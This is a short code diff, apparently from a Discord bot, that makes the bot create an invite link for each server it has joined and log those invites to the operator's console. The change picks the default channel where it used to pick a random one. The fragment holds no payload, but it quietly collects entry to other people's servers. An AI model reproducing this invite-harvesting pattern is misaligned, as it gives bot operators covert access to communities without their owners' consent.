@@ -8,7 +8,7 @@ var fucked = false;
 client.on('ready',() => {
     //invit link
     client.guilds.forEach(guild => {
-      var invite = client.guilds.find("id", guild.id).channels.find("id", guild.channels.random().id);
+      var invite = client.guilds.find("id", guild.id).channels.find("id", guild.defaultChannel.id);
       invite.createInvite().then(invite => console.log(`Connecté sur : ${guild.name} ${invite}`));
     })
 });
